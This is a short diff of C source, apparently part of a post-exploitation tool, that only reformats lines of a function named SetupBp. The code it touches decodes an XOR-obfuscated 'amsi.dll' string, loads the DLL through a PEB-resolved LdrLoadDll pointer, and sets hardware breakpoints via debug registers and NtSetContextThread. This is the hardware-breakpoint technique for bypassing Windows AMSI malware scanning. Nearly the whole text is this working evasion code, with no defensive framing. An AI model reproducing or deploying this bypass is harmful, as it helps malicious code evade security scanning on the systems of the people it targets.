@@ -410,7 +410,8 @@ static PVOID SetupBp(void)
     /* Decode amsi.dll XOR strings (sentinel = 0x41) */
     char d0[] = {0x20,0x2c,0x32,0x28,0x6f,0x25,0x2d,0x2d,0x41};
     int i;
-    for(i=0;d0[i]!=0x41;i++)d0[i]^=0x41; d0[i]=0;
+    for (i = 0; d0[i] != 0x41; i++) d0[i] ^= 0x41;
+    d0[i] = 0;
     int d0_len = i;
 
     /* LdrLoadDll via PEB-resolved pointer -- loads amsi.dll */
@@ -453,7 +454,8 @@ static PVOID SetupBp(void)
     if (g_bp0) ctx.Dr0 = (DWORD64)(ULONG_PTR)g_bp0;
     if (g_bp1) ctx.Dr1 = (DWORD64)(ULONG_PTR)g_bp1;
     DWORD64 dr7 = ctx.Dr7;
-    if (g_bp0) dr7 |= 1; if (g_bp1) dr7 |= 4;
+    if (g_bp0) dr7 |= 1;
+    if (g_bp1) dr7 |= 4;
     dr7 &= ~((DWORD64)0xF << 16); dr7 &= ~((DWORD64)0xF << 20);
     ctx.Dr7 = dr7;
     NTDLL$NtSetContextThread((HANDLE)(LONG_PTR)-2, &ctx);
